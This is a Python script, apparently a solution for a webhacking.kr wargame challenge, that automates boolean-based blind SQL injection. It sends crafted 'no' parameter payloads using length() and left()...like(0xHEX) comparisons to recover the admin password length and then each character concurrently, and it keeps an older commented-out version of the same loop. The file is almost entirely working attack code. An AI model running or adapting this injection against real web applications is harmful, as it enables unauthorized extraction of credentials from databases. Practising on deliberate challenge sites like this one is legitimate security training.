import asyncio
import aiohttp
import string

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)

URL = "https://webhacking.kr/challenge/web-31/rank.php"
SESSION_ID = "123"
cookies = {'PHPSESSID':SESSION_ID}

URL = "https://webhacking.kr/challenge/web-29/"
SESSION_ID = "1"
cookies = {'PHPSESSID':SESSION_ID}


semaphore = asyncio.Semaphore(5)  # Limit concurrent requests

async def fetch(session, payload):
    params ={'no':payload, 'id':'guest','pw':'guest'}


    timeout = aiohttp.ClientTimeout(total=10)  # Increase timeout duration
    try:
        async with session.post(URL, params=params, timeout=timeout) as response:
            return await response.text()
    except asyncio.TimeoutError:
        # print(f"Timeout occurred for payload: {payload}")
        return "timeout"  # Placeholder for timeout

async def find_password_length(session):
    for length in range(1, 50):  # Adjust the range based on expected max length
        payload = f'3||length(pw)like({length})#'
        

        response = await fetch(session, payload)
        if "admin" in response:
            print(f"Password length found: {length}")
            return length
    return None  # Return None if length not found

async def main():
    async with aiohttp.ClientSession() as session:
        password_length = await find_password_length(session)
        if password_length is None:
            print("Could not determine password length.")
            return
        
        password = ""
        i = len(password) + 1
        character_set = "_" + string.ascii_letters + string.digits + "{" + "}" + "-"+ '!' + "?" 

        while len(password) < password_length:
            tasks = []
            for c in character_set:  # Iterate through character set

                hex = string_to_hex((password+c).replace("_", r"\_").replace('.',r'\.').replace('%',r'\%'))
                payload = f'3||left(pw,{i})like(0x{hex})#'
        
                # print(c+":"+payload)
                tasks.append(fetch(session, payload))

                await asyncio.sleep(0.1)  # Delay between requests

            responses = await asyncio.gather(*tasks)

            for index, response in enumerate(responses):
                if index < len(character_set) and "admin" in response:
                    c = character_set[index]  # Correctly access character from character set
                    password += c
                    print(password.ljust(password_length, '*'))
                    break
            
            i += 1  # Move to the next character position

if __name__ == "__main__":
    asyncio.run(main())



# find no.
# 3%26%26left(pw,4)like(0x6C75636B)%23&id=guest&pw=guest

# pw = "luck"
# i = len(pw)+1
# while True:
#     for c in string.printable:

#         # params['no'] = f'1||((left(id,1)like(0x67))%26%26(left(pw,{i})like(0x{string_to_hex(id+c)})))%23'
#         hex = string_to_hex((pw+c).replace("_", r"\_").replace('.',r'\.').replace('%',r'\%'))
#         params['no'] = f'3||left(pw,{i})like(0x{hex})#'
#         # print(params['no'])
#         response = requests.get(URL, params=params, cookies=cookies)
#         print(c)
#         # print(response.text)
#         if "admin" in response.text:
#             if "guest".startswith(pw+c):
#                 continue
#             pw += c
#             i += 1
#             print(pw)
#             break
